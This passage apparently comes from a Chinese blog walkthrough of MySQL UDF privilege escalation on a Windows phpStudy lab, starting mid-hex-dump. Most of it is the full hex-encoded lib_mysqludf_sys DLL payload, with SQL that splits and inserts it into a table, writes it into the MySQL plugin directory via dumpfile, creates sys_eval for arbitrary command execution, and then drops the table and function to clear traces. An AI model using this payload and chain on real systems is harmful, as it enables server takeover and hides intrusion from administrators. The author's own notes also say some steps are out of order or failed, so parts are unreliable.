7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07 031F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 into dumpfile \"C:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\udf.dll\"; 本以为可以顺利做下去了，结果竟然没有plugin目录，这里也很疑惑，明明cmd查询到的，服了，这下得手动创建了（没有那味儿了） 5.1.5 创建一个表并将二进制数据插入到十六进制编码流 如果在低版本系统环境下（win2003）或部分特殊环境使用mysql命令提示符进行提权操作，由于不同环境下的mysql命令提示符可输入字符最大长度不同（win2003为8191，win10系统为65535），无法使用dumpfile一次性写入全部16进制字符，则需要将udf文件的16进制编码字符先进行切割，再拼接写入到一个表中，最后导出到目标系统。 注意：在进行16进制数据切割时，每段字符的长度要为4的倍数，2进制转为16进制使用取四合一法，如果位数不够会在最高位补0，补0后会破坏原始二进制文件的文件结构导致利用失败，这也是很多人此方法复现失败的原因。 5.1.6 随便选择一个数据库后，创建一个表 use test; create table udf(data longblob); 这里我是新建了一个数据库 5.1.7 insert插入第一段数据 当然这里如果你的数据长度恰好的话，直接插入也是可以的 insert into udf(data) values (0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07); 5.1.8 update拼接剩余数据 update udf set data = concat(data, 0x031F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000); 5.1.9 导出表中数据到系统磁盘 select data from udf into dumpfile \"C:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\udf.dll\"; 做到这里突然蒙蔽了，跟着文章做的，但是这里似乎又重复上传了一下，不理解是干嘛的。 我认为在5.1.5步骤之后应该是没有办法直接将udf文件传到plugin目录下的时候所应该有的，而该作者在5.1.5之前就已经靠sql语句写入到了plugin目录下，到这儿应该就是成功了吧，我不理解他的布局了，估计是混乱了 5.1.3 查看 plugin 目录，不存在 lib\\plugin目录但有webshell，可使用webshell创建lib\\plugin目录。 5.1.4 查看 plugin 目录，不存在 lib\\plugin目录也没有webshell，此时就要使用网传ADS文件流创建目录的方法了，上次听到这个名词还是在做upload-labs靶场的时候。 ADS文件流是NTFS文件系统为了能与Mac系统下的HFS文件系统兼容而设计出的。 经实践在命令提示符下使用ADS文件流是可以成功创建目录或者文件名的，但在独立安装的mysql数据库环境与phpstudy自带mysql环境下均创建失败，并且查阅网上各种文章也都是没有利用成功的，严重怀疑是哪位小可爱臆想出来的，但为了文章完整性还是决定写出来。 可见没有webshell几乎不可能了 echo 123 &gt;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib::$INDEX_ALLOCATION 如上图cmd下提示创建lib目录成功 select \"123\" into dumpfile \"C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib::$INDEX_ALLOCATION\"; 数据库下报错 5.2 mysql小于5.1版本时： 5.2.1 有webshell时，通过webshell上传udf文件。 5.2.2 无webshell时，使用dumpfile通过16进制数据流写入udf文件。 6、创建命令执行函数 使用winhex打开udf文件，在最下方可以看到udf文件提供的函数。 sys_eval，执行任意系统命令，并将输出返回。 sys_exec，执行任意系统命令，并将退出码返回（无命令执行结果回显）。 create function sys_eval returns string soname 'udf.dll'; 7、命令执行 select sys_eval(\"whoami\"); 可以将上述步骤简单总结一下： 注意先指定数据库 1. CREATE TABLE udftmp (c blob); //新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。 2. INSERT INTO udftmp values(unhex('udf文件的16进制格式')); //在udftmp中写入udf文件内容(udf.txt的内容) 3. SELECT c FROM udftmp INTO DUMPFILE 'D:\\\\labwork\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\udf.dll'; //将udf文件内容传入新建的udf文件中，路径根据自己的@@basedir修改 //对于mysql小于5.1的，导出目录为C:\\Windows\\或C:\\Windows\\System32\\ 2.6 痕迹清除 2.6.1 删除表 drop table udf; 2.6.2 删除函数 drop function sys_eval; 2.7 其他问题 1、ERROR 1125 (HY000) Function 'sys_eval' already exists 提示sys_eval 函数已经存在，可能已经被利用过了，尝试直接调用函数。 这里借用别人的图解了 2、提示sys_eval 函数已经存在，但无法利用 